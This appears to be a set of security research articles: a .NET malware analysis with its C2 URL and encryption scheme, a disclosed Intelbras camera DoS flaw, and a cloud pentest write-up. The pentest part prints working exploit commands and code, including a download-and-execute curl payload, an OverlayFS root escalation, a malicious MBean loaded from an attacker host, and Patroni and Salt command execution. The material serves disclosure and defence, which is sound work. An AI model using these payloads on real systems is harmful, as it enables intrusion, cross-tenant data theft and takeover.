*

Trusted SSL certificate thumbprint: * indicates that any certificate is trusted (disabling SSL pinning/validation). This entry also appears in a list, corresponding to the C2 item cu.

rh

Additional route header/data: not configured in this instance.

When dllhost.exe loads XAML-3, it loads template __P1__ and XAML-P2 one by one. When XAML-P2 loads, it retrieves the current domain via AppDomain.GetCurrentDomain() and then stores the values of the C2 configuration items (cu, tp, and rh; see the table above) in that domain using AppDomain.SetData(). Finally, XAML-P2 decodes and decompresses the embedded payload (.NET 2 Plugin), loads the .NET 2 Plugin into the current domain, and then calls the plugin’s entry method, m.C().

.NET 2 Plugin

This payload is a .NET assembly (PE file). As discussed above, it is loaded by XAML-P2 into the host process dllhost.exe. In the plugin’s entry method m.C(), a thread is spawned to execute the malicious operations.

The following key steps are executed in this thread:

Configuration initialization: Load the C2 configuration from the current AppDomain’s data storage and assign it to the corresponding member variables.

Gather system information from the registry:

"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\full", Key="Version" "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", Key="BuildLab"

Combine the queried values into a single string, for example: "4.7.03190\n17763.rs5_release.180914-1434". If any query fails, replace its result with a hyphen (“-“).

Clear the state of the exception‑state logging system: .NET 2 Plugin uses the same exception‑state logging system as the .NET 1 Loader.

Recursively delete 12 GUID subkeys from the registry. The algorithm that generates the GUID path is the same as the one used by .NET 1 Loader. The first eight GUIDs are the same as those that .NET 1 Loader attempted to remove. The remaining four GUIDs were generated using different integer seeds (integer seed = [From 1 to 4]|65536).

If steps 1 and 2 are completed successfully, generate a subkey using the integer seed 3|65536. Then create the following registry subkey:

"LocalMachine\SOFTWARE\Classes\appid\{ff259bcd-2f0a-44de-b34a-0092fec1d8a2} DllSurrogate = ""

Anti-analysis: Check whether the current host process is dllhost.exe by examining Environment.CommandLine.

Prevent the host process from exiting: Create a managed object and retrieve its IUnknown interface. Then call ole32.dll’s CoLockObjectExternal(IUnknown interface) to lock the object in memory, ensuring that the dllhost.exe process created by RPC is not released by the system.

Jitter delay: Before the initial request to the C2 server, wait for a random jitter delay of 20-40 minutes (set by the configuration item “is”=”1200-2400”) to evade sandboxes by causing them to time out.

Set maximum execution time: Create a timer that registers a callback function as a watchdog. The timer waits approximately 28 hours (100801 seconds, retrieved from the configuration item wi) before invoking the callback. The callback fetches the configuration item u, decodes its Base64‑encoded string, decompresses the output, and extracts a XAML snippet from the resulting data. It then loads this XAML, which ultimately triggers Environment.Exit(0).

Periodic polling:

Retrieve the config items cu and ii to build the full URL https://openaigpt4v.com/model_v4/94aafd58-c00c-402a-aae6-858b4486a1a4

Obtain the system proxy using three methods (see the Discovering proxies section below).

Register an HTTPS callback (ServerCertificateValidationCallback) that verifies the server‑side X.509 certificate against the configuration value tp before establishing the connection.

Then, combine the system information with additional details, such as whether the proxy is bypassed, whether it is using a proxy, and the current index in the C2 server list.

Next, encrypt the combined data with AES (see the AES encryption diagram in the network traffic section for more details), and then encode the encrypted output in Base64.

// Final HTTP request URL "https://openaigpt4v[.]com/model_v4/94aafd58-c00c-402a-aae6-858b4486a1a4?b=lM4V3VwrWtXBy4oBGUkXOHfxyLUlrT2hIZGn4C37W1Z3%2FeW1WURJqzaNLQhGFHsWxA2lpJHZSpd8VDLMOQRD%2FfsDswnomIrBpoaNzug3dOtrh1J2KIqZRmKx1TtQsxq1RAGu1y45rSKaPHm9s2HF8A%3D%3D&c=41bd7f37-c3f6-4a9e-b2f3-5363e9a2c095"

Hijack the HTTP User-Agent and replace the value following HOST: with the config value of item rh.

Retrieve a XAML file from the C2 server, update the configuration data, and load the retrieved XAML (for more details on techniques, see the Execute downloaded XAML payload in an isolated AppDomain section).

If a valid response is received from C2, the loop pauses for 5-6 minutes before the next request; otherwise, it pauses for 22-28 hours, checking every 10 minutes to determine whether the allotted time has elapsed.

AES encryption scheme for network traffic

All traffic between the malware and the C2 server is encrypted and authenticated using AES‑128‑CBC with HMAC. The encryption and authentication keys are derived from a master key – specified in the configuration as "ec"="9fT04e03tAiZAPogcDWt0w==" – by applying HMAC with distinct seed values.

For a given master key and a single-byte seed, the derivation works as follows:

Generate a 16‑byte sequence from the seed; this serves as the HMAC key.

Compute HMAC‑SHA256 over the master key to obtain an intermediate key.

Use this intermediate key as the HMAC key to compute HMAC‑SHA256 on the constant byte 0x01.

Take the first 16 bytes of the resulting hash; this becomes the final derived key.

Accordingly, the server-side encryption and decryption keys mirror those on the client (malware) side.

Seed

Key type generated (client side)

Key type generated (server side)

0

Decryption key

Encryption key

1

Decryption authentication key

Encryption authentication key

2

Encryption key

Decryption key

3

Encryption authentication key

Decryption authentication key

The code implements an encapsulation of AES-CBC encryption combined with HMAC-SHA256 integrity verification. It uses a randomly generated IV to symmetrically encrypt the plaintext in CBC mode and produces ciphertext. Next, it calculates an SHA256 message authentication code for the concatenated “IV+ciphertext” using a separate HMAC key. Finally, it concatenates the three segments – IV (16 bytes) | ciphertext | HMAC (32 bytes) – into a single byte array that constitutes the final encrypted message. This follows the standard cryptographic Encrypt-then-MAC construction. The receiver must validate the HMAC before decrypting with the corresponding key and IV, which ensures confidentiality, integrity, and tamper resistance.

Discovering proxies

.NET 2 Plugin detects the system proxy using three methods:

Retrieve the system‑wide proxy configuration using the Win32 WinHTTP API function WinHttpGetDefaultProxyConfiguration(), then extract the proxy server with the regular expression (?:([a-zA-Z]+)=)?(.*).

If that fails, locate the running explorer.exe process, impersonate its access token using Impersonate(), and retrieve its proxy configuration with the .NET API WebProxy.GetDefaultProxy().

If both methods fail, fall back to obtaining the proxy from the .NET property DefaultWebProxy.

These methods ensure that the malware can reach external networks even in complex network environments with proxies.

Execute downloaded XAML payload in an isolated AppDomain

This technique abuses MulticastDelegate again by using reflection to modify its private _invocationList array. .NET 2 Plugin creates a multicast delegate (CrossAppDomainDelegate) and replaces one entry in its invocation list with a malicious delegate pointing to XamlReader.Parse(). When AppDomain.DoCallBack() executes this multicast delegate, it iterates through the invocation list and invokes the injected XamlReader.Parse() to parse and execute the downloaded XAML.

In more detail, the process is as follows:

Create a new isolated AppDomain with a randomly generated GUID as its name.

Copy all configuration data from the current AppDomain into the new one.

Set the proxy information in the new AppDomain and assign it to the variable px.

Use TypeConfuseDelegate to replace TimeZoneInfo.ClearCachedData() with XamlReader.Parse(), thereby modifying the MulticastDelegate(CrossAppDomainDelegate).

Use appDomain.DoCallBack() to invoke XamlReader.Parse() within the isolated AppDomain, executing the downloaded XAML payload.

Transfer any updated configuration data from the new AppDomain back to the original AppDomain.

Unload the isolated AppDomain to complete the cleanup.

This technique keeps the downloaded malicious payload out of the main AppDomain, which increases stability and allows the payload to be fully cleaned up after execution.

Infrastructure

The attack relies on commercial hosting infrastructure. The C2 IP is part of Cloudflare’s CDN, and the domain name is registered with Cloudflare.

Domain

Sep 27, 2023

Cloudflare, Inc. / 15169

Victims

Based on KSN telemetry data, we identified a single victim in Asia. Additionally, we learned that the malware was designed to target a specially customized government‑only version of the Windows operating system. Consequently, we infer that the victims are Asian government entities.

Attribution

After analyzing the TTPs, code similarities, and infrastructure, we were unable to link the attack to any known APT group.

Conclusions

Technological sovereignty has become a global trend. In today’s geopolitical climate, a growing number of countries are building their own core software platforms, including operating systems, databases, middleware, and cloud services, with operating systems often the top priority. The advantage is that each country controls the development, operation, and upgrading of its own operating systems, granting it full autonomy over the entire process. On the other hand, it also means that each country must protect this entire vast ecosystem on its own. Bringing the operation and maintenance of such a system to maturity is a lengthy process. Until then, both the system and its emerging supply chain could be exposed to attacks through multiple vectors, increasing potential vulnerabilities.

articles.title: Millions of security cameras at risk: DoS vulnerability in Intelbras devices
articles.context: During our research, we discovered a denial-of-service vulnerability that affects Intelbras IP cameras systems
articles.full_text:
Background

Network-connected surveillance cameras are now widespread in both home and enterprise environments, so securing them is essential to safeguarding physical spaces and sensitive assets. As these devices continue to gain new features and network connectivity capabilities, vulnerabilities in their implementation can have significant security implications.

During our research, we discovered a denial-of-service vulnerability that affects Intelbras IP cameras systems. The flaw resides in a firmware update endpoint that is accessible without authentication and allows anyone with access to the local Wi-Fi network to knock cameras offline. A single request disrupts the camera for only about a minute, but sending periodic requests keeps the device offline indefinitely. We reported the issue to Intelbras, monitored the remediation process, validated the fix in the new firmware, and will now demonstrate the exploitation procedure step-by-step.

Following our notification, Intelbras patched the vulnerability and released updated firmware (R.260804) along with update instructions. A candidate ID of CAN-2026-2035970 has been assigned by MITRE following submission, pending the final CVE assignment. Additionally, the Intelbras team recently informed us that MITRE has classified the vulnerability as Medium, assigning it a score of 5.1 under the CVSS 4.0 framework. The issue discussed in this article is no longer present in the latest firmware version.

Firmware

Intelbras provides firmware files on its official website. While users can manually install these updates via an SD card, the cameras also natively support firmware upgrades over the local network via their web interface and mobile app. We obtained the firmware version v240927 for the iM3B-C (IM3 C) camera, which was the latest available version at the time of our research. According to Intelbras, the same firmware is also compatible with the iMX C, iM4 C, iM5 SC, iME 360 C, and iM7+ FC models. Below, we can view the firmware version and the camera model used as an example.

To provide context, we will explain how the camera’s authentication mechanism works and why it is relevant to accessing the camera’s endpoints. The main firmware component is an ARM binary named sonia, responsible for controlling the kernel drivers used by the camera hardware, authentication, and livestream recording, among other things.

How authentication works

The global.login RPC method handles authentication at the /RPC2_Login endpoint. First, the client, such as the mobile app or a custom script, sends the username and an empty password. The camera responds with an authentication challenge (a set of values to verify the password without transmitting it). This response returns a temporary session, the encryption type in the encryption field, a random value, and a realm (authentication scope). At this stage, a false response is normal and does not indicate a failed login, as the authentication process is not yet complete.

Next, the client calculates the response password from the authentication challenge. It first generates an MD5 (username:realm:original_password) hash as the base. It then calculates a second MD5 (username:random:first_md5) hash, where first_md5 is the result of the previous step. To complete the authentication, the client sends this final result back to /RPC2_Login in a second global.login call, passing the username, calculated password, and temporary session ID.

If the login is accepted, the camera returns true and a new, authenticated session. This session must be used for all subsequent RPC calls, including the camera’s other endpoints, for example, the one that reboots the device or those that expose sensitive information.

Affected endpoint

The affected endpoint is the firmware upgrade route http://<ip_address>/firmwareUpgrade_service/Demo, which lacks authentication checks; furthermore, it fails to verify whether the firmware is actually valid before initiating the upgrade process. This creates a serious issue because the upgrade requires the camera to reboot, and that is precisely when the problem occurs: the camera enters reboot mode and eventually shuts down, appearing offline to the user and anyone who has the camera registered on their device.

PoC: vulnerability exploitation

Now that we have outlined how the vulnerability works, we will use a Python script on an iM3B-C camera to exploit it for demonstration purposes. The exploit contacts the camera’s endpoint to upload firmware. Below, we can see sonia creating the endpoint responsible for the firmware upgrade.

Next, the exploit will hit the endpoint and cause the camera to reboot. Consequently, mobile phones running the Intelbras app will lose connection with the registered device. Below, we can see the camera operating normally: the green light is on and the app is showing it is available for viewing.

The camera is online

After the exploit executes, we can see the effects: the camera goes offline and loses connection to the registered devices.

The camera is offline

The exploit is quite simple: it sends an HTTP POST request with the firmware, which causes the camera to accept the request and initiate the reboot process. It does not matter whether the firmware is original; the reboot process will start regardless.

New firmware version

After we notified Intelbras about this flaw in the endpoint implementation, the company contacted the OEM vendor. As a result, a new firmware version was released that requires authentication to initiate an update through this endpoint.

Below, we can compare the new firmware, which validates cookies and session data, with the old firmware, which performed no authentication checks and proceeded directly to the update routine.

Real risk

An attacker can remotely trigger the camera firmware upgrade and reboot process without authenticating or supplying a valid firmware image. This may cause the device to go offline, which results in a denial-of-service condition preventing legitimate users from accessing live monitoring or managing the camera.

The potential impact is significant due to the number of affected users. The Intelbras Mibo Smart app, which the company provides to connect and manage the devices mentioned in this report, has over 4,000,000 downloads. Brazil represents the largest user base, followed by Paraguay, Ecuador, Colombia, Argentina, Chile, Peru, Bolivia, Uruguay, and Venezuela. As a result, exploitation of this issue affects a large number of users.

Takeaways

This is a medium-severity vulnerability that Intelbras is already aware of. The issue has been addressed in a newer firmware release (R.260804 along with update instructions), which mitigates this attack vector. Because the vulnerability directly affects the availability and normal operation of the affected cameras, it is highly recommended that users verify the firmware version currently installed on their devices and update to the latest available version as soon as possible. Keeping the firmware up to date is an essential security practice, especially for internet-connected surveillance devices, as outdated versions may remain exposed to known vulnerabilities.

articles.title: An insecure neighbor: how a vulnerability chain led to an isolation bypass in cloud infrastructure
articles.context: To exploit the vulnerability, a copy of the python3 interpreter was created with the setuid capability set, which made it possible to gain root privileges
articles.full_text:
This article is published for educational purposes only, to raise awareness among information security professionals. The research was part of an official bug bounty program on a major platform. We notified the cloud provider about the vulnerabilities in line with our responsible disclosure policy, and all security issues we found were fixed in full. The infrastructure analyzed in this post has been anonymized, so the organization cannot be identified. We believe that regular pentests, bug bounty programs, and conversations between developers and independent researchers are the foundation of security for any IT product.

Introduction

Many experts believe that cloud data breaches are mostly the customers’ fault, caused by issues like misconfigured storage or open ports. However, our penetration test of a major cloud provider demonstrated that critical threats can originate within the provider’s own infrastructure.

This analysis is based on a real-world case that won second place in the System Hacking (Web & Logic) category at Russian Pentest Award 2026. It covers the sequential exploitation of several vulnerabilities and logic errors. Together, they led to critical business consequences and a complete bypass of tenant isolation within the cloud. On October 22, 2026, I presented a technical analysis of this case in my “Smash the Tenant Boundary” talk at Security Analyst Summit (SAS 2026).

1. Gaining initial access through a managed Kubernetes cluster

Our cloud infrastructure pentest followed the threat model of an external attacker with the privileges of a regular tenant. The ultimate goal of the attack was to assume full control of the cloud.

1.1. Escaping the worker node

First, we created a resource in the cloud’s managed Kubernetes cluster (v1.25.16+k0s.0). As a rule, the provider deliberately withholds SSH access to worker nodes from tenants, because they’re paying for a managed service, not for running servers themselves. In this case, however, the cluster’s security policies did not prevent the creation of privileged pods with access to host namespaces. This enabled us to deploy a pod and switch the execution context to the host machine running the container.

kubectl run pod-name-bla \ --image=alpine \ --restart=Never \ --overrides=' { "apiVersion": "v1", "spec": { "hostPID": true, "containers": [ { "name": "priv", "image": "alpine", "command": [ "sh", "-c", "sleep 3600" ], "stdin": true, "tty": true, "securityContext": { "privileged": true } } ] } }'

After creating the privileged pod, we ran the nsenter command inside the container. It moved the execution context to the host machine:

nsenter --target 1 --mount --uts --ipc --net --pid – bash

After this, the bash shell ran on the actual host machine, not inside the container. Because the pod was privileged, we got full root access to the host machine.

Kubelet configuration and API server address

Next, we analyzed its file system. While researching the data plane, we found a Konnectivity service token. This component provides a tunnel between the control plane and the data plane of a Kubernetes cluster. It was this component that opened up interesting opportunities for developing the attack.

Konnectivity service account token

1.2. Analysis of control plane services

After gaining access to the host machine (the worker node mentioned earlier), we analyzed its network interfaces: the user VPC and the Calico interfaces. We extracted the kube-apiserver address (192.168.0.4) from the kubelet configuration file. A subsequent scan of this address revealed the following open ports:

192.168.0.4:9443 open https status=404 192.168.0.4:2380 open 192.168.0.4:6443 open http status=400 192.168.0.4:8132 open 192.168.0.4:9100 open http status=200 title="Node Exporter" 192.168.0.4:9308 open http status=200 title="kube-state-metrics"

Of greatest interest is port 8132, where Konnectivity runs. This service creates a reverse tunnel between the control plane and the data plane so that the data plane is visible from the control plane. This allows management components to communicate with worker nodes, even behind a NAT. The Konnectivity token found earlier granted permission to interact with this service.

Interaction diagram between control plane and data plane via Konnectivity

1.3. Exploiting Konnectivity

To analyze the service on port 8132, we deployed a local test environment. We found that v1.25.16+k0s.0 uses a fork of konnectivty-server, inherited from apiserver-network-proxy in the original Kubernetes.

A quick primer on k0s: this is a minimalist Kubernetes distribution designed for cloud providers. It’s a convenient base for deploying managed clusters (mk8s) with minimal resource overhead. An important feature of k0s is that running user pods on control plane nodes (also known as master nodes) is disabled by default. This meets mk8s security requirements for control plane isolation.

Port 8132, mentioned above, hosts AgentService, which provides a single method: Connect. This method accepts a Packet stream.

service AgentService { rpc Connect(stream Packet) returns (stream Packet) {} }

The code revealed an interesting detail: when AgentService receives a packet of the type DIAL_REQ from a worker node, the server calls the net.Dial() function on the control plane side. The packet structure for the Connect method looks like this:

//apiserver-network-proxy/konnectivity-client/proto/client/client.proto:26

enum PacketType { DIAL_REQ = 0; DIAL_RSP = 1; ... } message Packet { PacketType type = 1; oneof payload { DialRequest dialRequest = 2; DialResponse dialResponse = 3; Data data = 4; CloseRequest closeRequest = 5; CloseResponse closeResponse = 6; CloseDial closeDial = 7; } } message DialRequest { // tcp or udp? string protocol = 1; // node:port string address = 2; // random id for client, maybe should be longer int64 random = 3; }

The server reads any Packet packets from the stream initiated by the agent (worker node):

//apiserver-network-proxy/pkg/server/server.go:721 in, err := stream.Recv() ... recvCh <- in

Next, the packets go to the backend manager:

//apiserver-network-proxy/pkg/server/server.go:748 func (s *ProxyServer) serveRecvBackend(...) { for pkt := range recvCh { switch pkt.Type {

Then comes the most interesting part:

//apiserver-network-proxy/pkg/server/server.go:888 case client.PacketType_DIAL_REQ: req := pkt.GetDialRequest() klog.V(5).InfoS("Received DIAL_REQ", "target", req.Address) s.handleDialRequest(pkt, backend)

In other words, a DIAL_REQ that comes from the agent (worker node) was considered valid and passed to the packet handler for the corresponding type (DIAL_REQ).

//apiserver-network-proxy/pkg/server/server.go:921 func (s *ProxyServer) handleDialRequest(pkt *client.Packet, backend Backend) { ... dialReq := pkt.GetDialRequest() resp.GetDialResponse().Random = dialReq.Random start := time.Now() conn, err := net.Dial(dialReq.Protocol, dialReq.Address) // we control proto and address

This created an SSRF primitive in the control plane context, which made it possible to reach not only network resources but also host UNIX sockets. D-Bus (- /run/dbus/system_bus_socket) was chosen as a promising target for interaction. The busctl utility revealed the following services available on the control plane:

org.freedesktop.DBus org.freedesktop.PackageKit org.freedesktop.PolicyKit1 org.freedesktop.login1 org.freedesktop.systemd1 com.ubuntu.SoftwareProperties

Using the org.freedesktop.DBus.GetConnectionCredentials method with a custom D-Bus client we wrote on top of github.com/godbus/dbus/v5, we were able to retrieve the UID of the current process. In this case, it was 997. Unfortunately, it wasn’t root, which means we couldn’t instantly start a system service in systemd. However, it was still possible to create a user service (system –user). To do this, we first enabled lingering for our UID:

busctl --address=unix:path=/tmp/master-dbus.sock \ call org.freedesktop.login1 \ /org/freedesktop/login1 \ org.freedesktop.login1.Manager \ SetUserLinger ubb 997 true false

The following sockets were then opened:

/run/user/997/bus /run/user/997/systemd/private (this socket is the equivalent of running commands through systemctl --user.)

Through this new socket, we called the StartTransientUnit method of the org.freedesktop.systemd1.Manager service:

StartTransientUnit( name: string, mode: string, properties: a(sv), aux: a(sa(sv)) ) -> job object path

The properties parameter is exactly where you pass the standard systemd service definition directives. We added the following line:

ExecStart=/bin/sh -c "bash -lc 'curl ip:port/payload -o /tmp/love;chmod +x /tmp/love; setsid /tmp/love '"

As a result, we successfully received a callback from the control plane.

Konnectivity-server context and node network interfaces

Mirantis, the company behind the k0s project, confirmed the vulnerability.

1.4. Privilege escalation on the host

Since konnectivity-server runs with limited privileges by default, the next step after achieving RCE on the control plane was to escalate those privileges. An analysis of processes on the control plane node revealed a running salt-minion service. Root privileges allow authentication in salt-minion as that minion and further attacks against it (more on that later).

In our case, the target host ran Ubuntu 22.04 with kernel version 5.15.x. Because user namespaces were enabled, a known bug in OverlayFS offered a viable path to privilege escalation: it allows a file to retain the cap_setuid+eip capabilities after namespace manipulation.

To exploit the vulnerability, a copy of the python3 interpreter was created with the setuid capability set, which made it possible to gain root privileges.

rm -rf /tmp/lpe mkdir /tmp/lpe cd /tmp/lpe unshare -rm sh -c ' mkdir l u w m && cp /usr/bin/python3 l/ && chmod 755 l/python3 && setcap cap_setuid+eip l/python3 && mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/* ' getcap /tmp/lpe/u/python3 /tmp/lpe/u/python3 -c 'import os; os.setuid(0); os.system("id; /bin/sh")'

Confirmation of command execution with root privileges

Gaining root privileges opened up several interesting attack vectors:

We discovered an eth2 interface on the 100.64.0.0/10 subnet on the host. The cloud’s overlay network turned out to be flat, providing visibility into all managed services.

The system stored a salt-minion key pair. This significantly expands the attack surface by providing access to the managed cloud’s own control plane through SaltStack.

2. Adventures in the overlay network

2.1. Victoria stack

An examination of network activity within the managed resource immediately yielded interesting results. Traffic analysis revealed requests from a specific IP address to collect node metrics from our kube-state-metrics instance in mk8s. The IP address turned out to belong to a metrics collector, one of the VictoriaMetrics instances serving numerous managed resources. Like Prometheus, the VictoriaMetrics API exposes a list of targets from which it collects metrics.

When we queried the http://100.64.13.37:8429/api/v1/targets endpoint, we found that each target’s labels contained valuable metadata:

"discoveredLabels": { "__address__": "http://100.64.1.1:6897/metrics", "__meta_url": "CENSORED", "__metrics_path__": "/metrics", "__scheme__": "http", "__scrape_interval__": "2m0s", "__scrape_timeout__": "2m0s", "cluster_id": "676767", "customer": "customerID", "job": "http", "profile": "kubernetes", "vds_id": "1337", "version": "1.0" }

It’s worth noting that a single VictoriaMetrics query returns a full list of control plane hosts that belong to other cloud tenants. Port 6897 indicates that the kube-state-metrics exporter is running, and the profile: kubernetes field further confirms the target type at this address.

We found another host from the Victoria ecosystem on the same network: VictoriaLogs. The service’s web interface on port 9428 also exposes API endpoints that can reveal sensitive data. For example, the /select/logsql/query endpoint allowed unauthorized access to all logs from any managed resource in the cloud. Analysis of the control plane logs for mk8s revealed a critical detail: the cloud-init scripts generated private SSH keys for the root account by default. These keys were printed to stdout and automatically saved in the shared system logs.

Correlating certain label values from VictoriaMetrics helped us reconstruct the target host’s original names. This makes it easier to filter data in VictoriaLogs and unambiguously match a compromised private key to the target node where it can be used.

Private SSH key in a VictoriaLogs record

We could use the compromised private key for a privileged account to connect to the target nodes over SSH and gain full control of other tenants’ clusters.

Process privileges on the host and available actions in Kubernetes

Logs from other types of services could likely reveal additional sensitive data that would further increase the impact.

2.2. Compromising managed Kafka instances

We explored the option to deploy managed Apache Kafka resources. As expected, we also found these instances on the flat overlay network. One Kafka host had port 9999 open, which turned out to be a JMX Registry.

Discovered Java RMI service on port 9999

The JMX Registry mechanism is inherently vulnerable: it returns an RMI stub-host to the calling client, which allows remotely loading an arbitrary custom MBean class and executing arbitrary code. We ran an nmap -sC scan against the registry port to identify the exact port of the RMI service we would interact with next. To carry out the attack, we prepared a set of Java scripts with the following structure:

JmxCreateMBean.java: connects to the JMX Registry and creates an MBean component, javax.management.loading.MLet (a class that loads classes from a specified URL).

JmxInvoke.java: invokes the selected MBean method through the JMX Registry.

ExecMBean.java and Exec.java a custom lightweight test MBean component with a run(String cmd) method that provides an interface for remote command execution.

The code that handles the connection and initialization of the MBean component looks like this:

//JmxCreateMBean.java ... import javax.management.remote.JMXConnector; import javax.management.remote.JMXConnectorFactory; import javax.management.remote.JMXServiceURL; public class JmxCreateMBean { private static final class RewritingSocketFactory extends RMISocketFactory { private final String fromHost; private final String toHost; RewritingSocketFactory(String fromHost, String toHost) { ... } @Override public Socket createSocket(String host, int port) throws IOException { ... } @Override public ServerSocket createServerSocket(int port) throws IOException { ... } } public static void main(String[] args) throws Exception { ... RMISocketFactory.setSocketFactory(new RewritingSocketFactory(args[2], args[3])); String url = String.format("service:jmx:rmi:///jndi/rmi://%s:%s/jmxrmi", args[0], args[1]); try (JMXConnector connector = JMXConnectorFactory.connect(new JMXServiceURL(url), new HashMap<>())) { var mbsc = connector.getMBeanServerConnection(); try { ObjectInstance created = mbsc.createMBean(args[4], new ObjectName(args[5])); System.out.println("CREATED " + created.getObjectName() + " " + created.getClassName()); } catch (InstanceAlreadyExistsException e) { System.out.println("EXISTS " + args[5]); } } } }

Below is the implementation of the malicious Exec.java class, which provides methods to execute shell commands and read and write files with Base64 encoding:

// Exec.java import java.nio.charset.StandardCharsets; import java.nio.file.Files; import java.nio.file.Path; import java.util.Base64; public class Exec implements ExecMBean { @Override public String run(String cmd) throws Exception { Process p = new ProcessBuilder("/bin/sh", "-c", cmd).redirectErrorStream(true).start(); byte[] out = p.getInputStream().readAllBytes(); int rc = p.waitFor(); return "rc=" + rc + "\n" + new String(out, StandardCharsets.UTF_8); } @Override public String getB64(String path) throws Exception { return Base64.getEncoder().encodeToString(Files.readAllBytes(Path.of(path))); } @Override public String putB64(String path, String b64) throws Exception { byte[] data = Base64.getDecoder().decode(b64); Files.write(Path.of(path), data); return "wrote " + data.length + " bytes"; } }

After compiling our custom MBean, we place the resulting JAR file on a remote web server and prepare an mlet.html configuration file so the target server can load it.

<html> <mlet code="Exec" archive="execmbean.jar" name="payload:type=Exec"></mlet> </html>

We then perform the following steps:

Create a standard MLet loader inside the Kafka JVM.

Load the malicious MBean onto the target server by calling the getMBeansFromURL method of the standard MLet component (DefaultDomain:type=MLet). The URL of the prepared file is passed as an argument: http://attacker_ip:8000/mlet.html.

Call the run(String cmd) method of the loaded MBean to achieve RCE on the host.

Kafka process context and node network interfaces

This attack vector was possible because the RMI stub host, which security standards require to be bound only to the loopback interface (127.0.0.1), was mistakenly exposed to the cloud’s shared overlay network.

2.3. Credential leakage through redis-exporter

The next step was to analyze hosts running managed Redis instances. Alongside the main port 6379 used by Redis, each host had a redis exporter service on port 9121. Analysis of its source code revealed a logic vulnerability in how the target parameter was handled:

//redis_exporter/exporter/http.go:47 func (e *Exporter) scrapeHandler(w http.ResponseWriter, r *http.Request) { target := r.URL.Query().Get("target") ... if !strings.Contains(target, "://") { target = "redis://" + target } u, err := url.Parse(target) ... opts := e.options ... _, err = NewRedisExporter(target, opts) ...

Essentially, the /scrape handler accepts an arbitrary target parameter and attempts to collect metrics from that target with the same credentials the exporter uses to connect to its primary Redis instance. Directing a redis exporter request to an attacker-controlled host, such as one running nc -nvlp 6379, makes it possible to intercept the following credentials:

http://<redis_expoter_host>:9121/scrape?target=<fake_redis_server>

AUTH command in an intercepted Redis request

The captured credentials allowed access to other customers’ Redis instances to read, modify, or delete stored data.

Diagnostic information of the Valkey instance

(Note. A Redis RCE vulnerability was disclosed during the research. Combined with the access obtained, it made it possible to fully compromise other tenants’ services).

2.4. Compromise of managed PostgreSQL (Patroni) clusters

The PostgreSQL DBMS is one of the most popular managed resources alongside mk8s. The next step was therefore to analyze PostgreSQL hosts in the overlay network. Scanning nodes with the PostgreSQL port (5432) open revealed related services on ports 2379 (an etcd distributed store) and 8008 (Patroni REST API). While the Patroni REST API required authentication, access to etcd was completely unrestricted. Analysis of the contents of etcd revealed a critical key, /v2/keys/service/pg-cluster/config, which contained the Patroni configuration.

Patroni configuration in etcd

{ "ttl": 30, "loop_wait": 10, "retry_timeout": 10, "maximum_lag_on_failover": 1048576, "postgresql": { "use_pg_rewind": true, "parameters": { "archive_command": "id", "archive_mode": "always", "max_connections": 550, "max_locks_per_transaction": 512, "max_worker_processes": 27 } } }

Write access to this configuration file allows an attacker to set archive_command to a command of their choice and achieve RCE on the target host when the archiving process starts. To avoid waiting for the WAL to fill up through normal activity, a way was found to force archiving even with minimal access privileges:

Update the Patroni configuration with the modified archive_command:

curl -s -X PUT http://localhost:2379/v2/keys/service/<CLUSTER_NAME>/config -d value="$(jq -c . config.json)" | jq

Update the configuration again to add the standby_cluster parameter:

{ "ttl": 30, "loop_wait": 10, "retry_timeout": 10, "maximum_lag_on_failover": 1048576, "postgresql": { "use_pg_rewind": true, "parameters": { "archive_command": "rce", "archive_mode": "on", "archive_timeout": "10", "max_connections": 550, "max_locks_per_transaction": 512, "max_worker_processes": 27 } }, "standby_cluster": { "host": "192.0.2.1", "port": 5432 } }

After this parameter is applied, Patroni detects a role conflict for the current primary. The logs show a sequence similar to the following:

cannot be a real primary in standby cluster Demoting self (demote-cluster) received fast shutdown request checkpoint starting: shutdown immediate

Postgres then restarts, and the archiving process runs and executes the injected command:

PostgreSQL process context and node network interfaces

This makes it possible to log in to other tenants’ Postgres DBMS instances and gain full control over the data. As an additional risk factor, files containing credentials for access to S3 storage were found on these hosts.

Database and S3 access parameters in a backup file

This storage holds backups not only of the current instance but also of all other databases in the cloud.

List of backup storage locations in S3

3. Attack on SaltStack management infrastructure

After gaining root access to the control plane node, the focus shifted to the SaltStack configuration management service.

3.1. Analysis of salt fs

The first step was to dump the entire Salt master file system for subsequent static analysis:

Fragment of the Salt Master file list

It contained numerous files.

salt-call --out=newline_values_only cp.list_master saltenv=redacted | sed '/^$/d' | while read -r f; do mkdir -p "/tmp/dump/$(dirname "$f")" salt-call --out=newline_values_only cp.get_file "salt://$f" "/tmp/dump/$f" saltenv=redacted >/dev/null done

Because the Salt version in use was up to date, no known CVEs were applicable. However, we found a custom script (_pillar/somebase.py) with a critical vulnerability among the files on the Salt master. The vendor had written it to service minions running the somebase service. The vulnerability is an insecure SQL query construction through the query.format() method:

sql = query.format( minion_id=minion_id, pillar={**pillar, **results}, grains=__grains__, ) loaded_items = db_connections[db_alias].load_object_list(sql)

A Salt minion can trigger a pillar refresh and pass arbitrary metadata (grains) to the Salt master. This allows an attacker to inject SQL code through the some_id parameter inside grains. When the extension on the Salt master side processes the request, the generated SQL query is executed in the prod-cloud database. As a result, the vulnerability makes an error-based SQL injection possible.

Database error during pillar processing

3.2. Exploiting the SQLi

This vulnerability provided access to various database schemas. The most interesting one was the cloudsmth schema, which contained about 50 tables with metadata of all managed resources and VDS.

Fragment of the table list in the cloudsmth schema

Even more notable was the salt-masters table, which held authentication tokens for all Salt masters.

Records with Salt Master authentication tokens

With these tokens, we could access the Salt master REST API and run arbitrary commands on all minions in the cloud:

curl -k https://salt-master:8000 -H "Accept: application/json" -H "Content-Type: application/json" -H "X-Auth-Token: REDACTED" -d '[{"client":"local","tgt":"hostname-minion","fun":"cmd.run","arg":["id; hostname"]}]'

By agreement with the vendor, the attack was not developed further. Even so, access to the salt-masters table and the prod-cloud database would have made it possible to take over all resources, including VDS, S3, and other services, in a single step.

4. Other ways to attack the cloud

It’s worth mentioning other ways to get into the overlay network, since some of them also produced interesting cases.

4.1. Exploiting a vulnerability in Managed Valkey

